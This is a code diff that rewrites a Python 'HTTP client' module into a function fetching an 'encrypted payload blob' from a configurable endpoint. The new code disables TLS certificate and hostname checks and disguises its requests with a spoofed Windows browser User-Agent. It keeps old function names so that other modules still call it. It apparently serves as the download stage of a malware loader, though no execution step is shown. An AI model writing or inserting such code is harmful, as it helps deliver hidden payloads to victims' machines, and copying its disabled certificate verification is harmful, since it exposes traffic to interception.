@@ -1,55 +1,43 @@
 # -*- coding: utf-8 -*-
 """
-HTTP client — manages session and data exchange with remote service endpoints.
+HTTP client — retrieves the encrypted payload blob from the configured endpoint.
 """
-import json
 import ssl
-import socket
-import os
-import platform
-import http.client
-from urllib.parse import urlparse
+import urllib.request
+import urllib.error
 
-_TIMEOUT = 20
-_RETRIES = 3
-_UA = "Python/" + platform.python_version()
+from .env import TIMEOUT
+
+_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 
 
-def _req(hostname, path, body, timeout):
+def fetch(endpoint: str) -> bytes | None:
+    """GET the encrypted blob. Returns raw bytes, or None on failure."""
+    if not endpoint or not endpoint.startswith(("http://", "https://")):
+        return None
+
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    
-    conn = http.client.HTTPSConnection(hostname, 443, context=ctx, timeout=timeout)
-    hdrs = {
-        "Content-Type": "application/json",
-        "User-Agent": _UA,
-    }
-    conn.request("POST", path, body=body, headers=hdrs)
-    resp = conn.getresponse()
-    data = resp.read()
-    conn.close()
-    return json.loads(data)
+
+    req = urllib.request.Request(endpoint, headers={"User-Agent": _UA})
+    try:
+        with urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx) as resp:
+            if resp.status != 200:
+                return None
+            data = resp.read()
+    except (urllib.error.URLError, TimeoutError, OSError):
+        return None
+
+    if not data or len(data) < 64:
+        return None
+    return data
 
 
-def _send(url, data=None, timeout=_TIMEOUT):
-    body = json.dumps(data).encode() if data else b""
-    parsed = urlparse(url)
-    
-    for _ in range(_RETRIES):
-        try:
-            return _req(parsed.hostname, parsed.path, body, timeout)
-        except Exception:
-            pass
-    
-    raise ConnectionError("Request failed after retries")
-
-
+# Legacy signatures kept so any other module importing them still resolves.
 def connect(endpoint):
-    """Connect to the endpoint."""
-    return _send(endpoint + "/api/v1/auth/session", timeout=15)
+    return fetch(endpoint)
 
 
-def fetch(endpoint, payload):
-    """Fetch data from the endpoint."""
-    return _send(endpoint + "/api/v1/data/sync", data=payload, timeout=30)
+def _send(url, data=None, timeout=None):
+    return fetch(url)
